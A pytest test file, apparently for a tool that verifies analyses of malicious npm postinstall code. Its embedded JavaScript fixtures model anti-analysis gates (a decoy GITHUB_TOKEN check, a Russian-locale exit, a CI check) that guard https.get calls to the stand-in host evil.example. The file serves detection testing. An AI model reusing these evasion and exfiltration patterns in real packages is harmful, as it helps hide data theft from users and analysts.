"""Shapes string-table decoding leaves behind (bracket members, `process["exit"]`, alias declarations, comma tests),
evade gates written in payload-reaching form, and payload paths through dynamic dispatch: bind hops the checker can
tie, and partial witnesses marked `unresolved` that stay open. Each asserts the exact verdict."""
import pytest

from tools.tests.helpers import cite
from tools.verify import witness
from tools.tests.verify.test_verify_regressions import assert_verified, cond, finished, guard, region

EVADE = """const https = require('https');
const _b = 1;
function decoy() { const _a = _b; return process.env["GITHUB_TOKEN"] !== void 0 && process.env["GITHUB_TOKEN"]["startsWith"]('ghp_decoy'); }
function isRu() { return (process.env["LANG"] || '')["startsWith"]('ru'); }
function setup() {}
function main() {
  if (decoy()) process["exit"](0);
  if (setup(), isRu()) process["exit"](0);
  https["get"]('https://evil.example/x');
}
main();
"""
TOKEN_SITE = "process.env[\"GITHUB_TOKEN\"][\"startsWith\"]('ghp_decoy')"
LANG_SITE = "(process.env[\"LANG\"] || '')[\"startsWith\"]('ru')"


def evade_gate(gid, cid, guard_line, guard_text, payload=()):
    def build(work):
        return {"gate_id": gid, "hook": "postinstall", "expression": cid, "provenance": "out_of_set",
                "guards": [guard("index.js", guard_line, guard_text, [cid], kind="early_exit", arm="else")(work)],
                "polarity": "evade", "effect": "enables", "purpose": "anti_analysis", "purpose_reason": "x",
                "then": {"min_conditions": 1, "behaviours": ["exfil"], "env_recipe": {}, "recipe_guessed_fields": [],
                         "regions": [region("index.js", 9, "https[\"get\"]('https://evil.example/x')",
                                            node_type="call_expression")(work)],
                         "payload": [p(work) for p in payload]},
                "else": None}
    return build


def exfil(line, text, witness=(), unresolved=None):
    def build(work):
        p = {"behaviour": "exfil", "sink_kind": "network", "sink": cite(work, "index.js", line, text),
             "witness": [{"hop": h, "anchor": cite(work, "index.js", ln, t, node_type=nt)} for h, ln, t, nt in witness]}
        if unresolved:
            p["unresolved"] = unresolved
        return p
    return build


def evade(repo, name, op1="not_startswith", op2="not_startswith"):
    return finished(repo, name, {"index.js": EVADE},
                    [cond("c1", "index.js", 3, TOKEN_SITE, "env_var", "process.env.GITHUB_TOKEN", op1, "ghp_decoy"),
                     cond("c2", "index.js", 4, LANG_SITE, "locale_language", "process.env.LANG", op2, "ru")],
                    [evade_gate("g1", "c1", 7, "if (decoy()) process[\"exit\"](0);",
                                [exfil(9, "https[\"get\"]('https://evil.example/x')")]),
                     evade_gate("g2", "c2", 8, "if (setup(), isRu()) process[\"exit\"](0);",
                                [exfil(9, "https[\"get\"]('https://evil.example/x')")])])


def test_bracket_exits_and_decoded_helpers_verify_in_payload_form(repo):
    v = evade(repo, "evade-ok")
    # process["exit"] ends the guard, so the rest of main() is its else side; the alias line in decoy() and the
    # comma in g2's test do not hide the helpers; s["startsWith"] reads as startswith, negated by the early exit
    assert_verified(v, "c1.L1", "c1.L2", "c2.L1", "c2.L2", "g1.then.L3", "g1.L4", "g2.L4", "g1.then.L5")
    assert v["g1.then.L3.excl"]["grade"] == "exclusive"


def test_an_evade_test_written_in_trigger_form_is_refuted(repo):
    v = evade(repo, "evade-trigger", op1="startswith", op2="startswith")
    for cid in ("c1.L2", "c2.L2"):
        assert v[cid]["verdict"] == "refuted" and v[cid]["reason_code"] == "operator_mismatch", v[cid]
        assert "not_startswith" in v[cid]["evidence"]


DISPATCH = """const https = require('https');
class Sender { send(d) { https.get('https://evil.example/' + d); } }
class Mailer { send(d) { return d; } }
class Batch { constructor(o) { this.o = o; } flush() { this.o["dispatch"]('x'); } }
function relay(d) { new Sender()["send"](d); }
function run(cb) { cb('x'); }
class Hub { constructor() { this.s = new Sender(); } go() { this.s["send"]('x'); } }
if (process.env.CI) {
  const b = new Batch({ 'dispatch': relay });
  b["flush"]();
  run(relay);
  new Hub()["go"]();
}
"""
SINK = (2, "https.get('https://evil.example/' + d)")
BLOCK = "{\n  const b = new Batch({ 'dispatch': relay });\n  b[\"flush\"]();\n  run(relay);\n  new Hub()[\"go\"]();\n}"
VIA_OBJECT = [("bind", 9, "'dispatch': relay", "pair"),
              ("call", 10, "b[\"flush\"]()", "call_expression"),
              ("def", 4, "flush() { this.o[\"dispatch\"]('x'); }", "method_definition"),
              ("call", 4, "this.o[\"dispatch\"]('x')", "call_expression"),
              ("def", 5, "function relay(d)", "function_declaration"),
              ("call", 5, "new Sender()[\"send\"](d)", "call_expression"),
              ("def", 2, "send(d) { https.get", "method_definition")]


def dispatched(repo, name, witness, unresolved=None, sink=SINK):
    return finished(repo, name, {"index.js": DISPATCH},
                    [cond("c1", "index.js", 8, "process.env.CI", "ci_marker", "process.env.CI", "truthy", None)],
                    [lambda work: {
                        "gate_id": "g1", "hook": "postinstall", "expression": "c1", "provenance": "out_of_set",
                        "guards": [guard("index.js", 8, "if (process.env.CI)", ["c1"])(work)],
                        "polarity": "activate", "effect": "enables", "purpose": "targeting", "purpose_reason": "x",
                        "then": {"min_conditions": 1, "behaviours": ["exfil"], "env_recipe": {},
                                 "recipe_guessed_fields": [], "regions": [region("index.js", 8, BLOCK)(work)],
                                 "payload": [exfil(*sink, witness, unresolved)(work)]},
                        "else": None}])


def test_a_function_handed_over_in_an_object_is_tied_by_a_bind_hop(repo):
    v = dispatched(repo, "bind-pair", VIA_OBJECT)
    assert_verified(v, "g1.then.L3")


def test_without_the_bind_the_renamed_call_is_dynamic_dispatch(repo):
    v = dispatched(repo, "no-bind", VIA_OBJECT[1:])
    assert v["g1.then.L3"]["verdict"] == "cannot_tell" and v["g1.then.L3"]["reason_code"] == "dynamic_dispatch"


def test_a_function_passed_as_an_argument_binds_the_parameter(repo):
    v = dispatched(repo, "bind-arg", [("call", 11, "run(relay)", "call_expression"),
                                      ("bind", 11, "relay", "identifier"),
                                      ("def", 6, "function run(cb)", "function_declaration"),
                                      ("call", 6, "cb('x')", "call_expression"),
                                      ("def", 5, "function relay(d)", "function_declaration"),
                                      ("call", 5, "new Sender()[\"send\"](d)", "call_expression"),
                                      ("def", 2, "send(d) { https.get", "method_definition")])
    assert_verified(v, "g1.then.L3")


def instance_path(cls_line, method_text):
    return [("call", 12, "new Hub()[\"go\"]()", "call_expression"),
            ("def", 7, "go() { this.s[\"send\"]('x'); }", "method_definition"),
            ("bind", 7, "this.s = new Sender()", "assignment_expression"),
            ("call", 7, "this.s[\"send\"]('x')", "call_expression"),
            ("def", cls_line, method_text, "method_definition")]


def test_an_object_stored_on_a_property_decides_the_method_class(repo):
    # the bind sits in Hub's constructor, outside go(): strict scoping refuses it there
    v = dispatched(repo, "bind-instance-scope", instance_path(2, "send(d) { https.get"))
    assert v["g1.then.L3"]["verdict"] == "refuted" and v["g1.then.L3"]["reason_code"] == "outside_region"


def nodes(kind, src=DISPATCH):
    """`find(prefix, line)` for the `kind` node on that line whose text starts with prefix."""
    from tools.common.tsparse import PARSERS, descendants, text
    found = [n for n in descendants(PARSERS["js"].parse(src.encode()).root_node) if n.type == kind]
    return lambda prefix, line: next(n for n in found if n.start_point[0] + 1 == line and text(n).startswith(prefix))


def test_a_bind_naming_one_class_refutes_a_method_of_another():
    calls, methods = nodes("call_expression"), nodes("method_definition")
    call = calls("this.s[\"send\"]", 7)
    sender, mailer = methods("send(d)", 2), methods("send(d)", 3)
    aliases = [{"key": "s", "kind": "instance", "class": "Sender"}]
    assert witness.tie_call(call, "js", sender, aliases, []) is None
    bad = witness.tie_call(call, "js", mailer, aliases, [])
    assert (bad["verdict"], bad["reason_code"]) == ("refuted", "broken_hop")
    # without the bind, the tie rests only on the shared method name, which is not proof: cannot_tell, not
    # accepted (the bind is what makes the class checkable)
    weak = witness.tie_call(call, "js", mailer, [], [])
    assert (weak["verdict"], weak["reason_code"]) == ("cannot_tell", "name_only_link")


def test_new_reaches_the_constructor_of_the_named_class_only():
    news, methods = nodes("new_expression"), nodes("method_definition")
    ctor_hub, ctor_batch = methods("constructor()", 7), methods("constructor(o)", 4)
    assert witness.tie_call(news("new Hub()", 12), "js", ctor_hub, [], []) is None
    assert witness.tie_call(news("new Hub()", 12), "js", ctor_batch, [], [])["verdict"] == "cannot_tell"


def test_a_bind_hop_on_a_call_is_refused_at_write_time(repo):
    with pytest.raises(SystemExit, match="guard or sink anchors do not fit"):
        dispatched(repo, "bind-bad", [("bind", 10, "b[\"flush\"]()", "call_expression")] + VIA_OBJECT[1:])


def test_an_unresolved_path_is_checked_as_far_as_given_and_left_open(repo):
    v = dispatched(repo, "partial", VIA_OBJECT[1:4], unresolved="dynamic_dispatch")
    assert v["g1.then.L3"]["verdict"] == "cannot_tell" and v["g1.then.L3"]["reason_code"] == "dynamic_dispatch"
    assert v["g1.then.L3.excl"]["grade"] == "unknown"


def test_a_broken_hop_in_an_unresolved_path_is_still_refuted(repo):
    # cb('x') sits in run(), not in flush() where the path has got to
    wrong = VIA_OBJECT[1:3] + [("call", 6, "cb('x')", "call_expression")]
    v = dispatched(repo, "partial-bad", wrong, unresolved="dynamic_dispatch")
    assert (v["g1.then.L3"]["verdict"], v["g1.then.L3"]["reason_code"]) == ("refuted", "outside_region")


@pytest.mark.parametrize("unresolved", [None, "dynamic_dispatch"])
def test_an_empty_witness_with_the_sink_outside_the_region_is_never_exclusive(repo, unresolved):
    v = dispatched(repo, f"empty-{unresolved}", [], unresolved=unresolved)
    excl = v["g1.then.L3.excl"]
    assert excl["verdict"] == "cannot_tell" and excl["grade"] == "unknown"
    l3 = v["g1.then.L3"]
    assert (l3["verdict"], l3["reason_code"]) == (("refuted", "outside_region") if unresolved is None
                                                  else ("cannot_tell", "dynamic_dispatch"))


def test_an_unresolved_path_forces_review(record):
    from tools.common import contract
    assert "payload path not fully traced" not in contract.review_triggers(record)
    record["gates"][0]["then"]["payload"][0]["unresolved"] = "dynamic_dispatch"
    assert "payload path not fully traced" in contract.review_triggers(record)


HELPER_EXIT = """const https = require('https');
function isRu() { return (process.env["LANG"] || '')["startsWith"]('ru'); }
function check() {
  if (isRu()) process["exit"](0);
}
function leave() {
  if (isRu()) return;
}
async function main() {
  try {
    await check();
    https["get"]('https://evil.example/x');
  } catch {}
}
main();
"""
REGION = "https[\"get\"]('https://evil.example/x')"


def helper_exit(repo, name, guard_line, guard_text, via):
    def build(work):
        g = guard("index.js", guard_line, guard_text, ["c1"], kind="early_exit", arm="else")(work)
        if via:
            g["via"] = [cite(work, "index.js", ln, t, node_type=nt) for ln, t, nt in via]
        return {"gate_id": "g1", "hook": "postinstall", "expression": "c1", "provenance": "out_of_set",
                "guards": [g], "polarity": "evade", "effect": "enables", "purpose": "targeting", "purpose_reason": "x",
                "then": {"min_conditions": 1, "behaviours": ["exfil"], "env_recipe": {}, "recipe_guessed_fields": [],
                         "regions": [region("index.js", 12, REGION, node_type="call_expression")(work)],
                         "payload": [exfil(12, REGION)(work)]},
                "else": None}
    return finished(repo, name, {"index.js": HELPER_EXIT},
                    [cond("c1", "index.js", 2, "(process.env[\"LANG\"] || '')[\"startsWith\"]('ru')", "locale_language",
                          "process.env.LANG", "not_startswith", "ru")], [build])


def test_a_process_exit_in_a_helper_guards_the_code_after_its_call(repo):
    v = helper_exit(repo, "via-ok", 4, "if (isRu()) process[\"exit\"](0);", [(11, "check()", "call_expression")])
    assert_verified(v, "c1.L1", "c1.L2", "g1.then.L3", "g1.L4")


def test_without_via_a_helper_exit_is_held_open(repo):
    # the exit in check() does guard the caller's code, but without `via` the CFG cannot follow the call: the claim
    # is true and only under-cited, so it is held open, never refuted
    v = helper_exit(repo, "via-missing", 4, "if (isRu()) process[\"exit\"](0);", [])
    assert v["g1.then.L3"]["verdict"] == "cannot_tell"


def test_via_needs_an_exit_that_ends_the_process(repo):
    # a return only leaves leave(), so the caller goes on regardless
    v = helper_exit(repo, "via-return", 7, "if (isRu()) return;", [(11, "check()", "call_expression")])
    assert (v["g1.then.L3"]["verdict"], v["g1.then.L3"]["reason_code"]) == ("refuted", "broken_hop")


def test_via_must_call_the_function_holding_the_exit(repo):
    # main() runs main, not check(), so it cannot carry check's exit
    v = helper_exit(repo, "via-wrong", 4, "if (isRu()) process[\"exit\"](0);", [(15, "main()", "call_expression")])
    assert (v["g1.then.L3"]["verdict"], v["g1.then.L3"]["reason_code"]) == ("refuted", "broken_hop")


def test_via_on_a_non_call_is_refused_at_write_time(repo):
    with pytest.raises(SystemExit, match="guard or sink anchors do not fit"):
        helper_exit(repo, "via-bad", 4, "if (isRu()) process[\"exit\"](0);", [(10, "try", "try_statement")])


def test_a_sink_in_another_version_of_the_file_is_not_outside():
    raw = {"file": "setup.py", "derived_from": None, "start_byte": 0, "end_byte": 50}
    assert witness._other_version({"file": "setup.py", "derived_from": "d1", "start_byte": 900, "end_byte": 910},
                                  [raw])
    assert not witness._other_version({"file": "other.py", "derived_from": None, "start_byte": 0, "end_byte": 5},
                                      [raw])
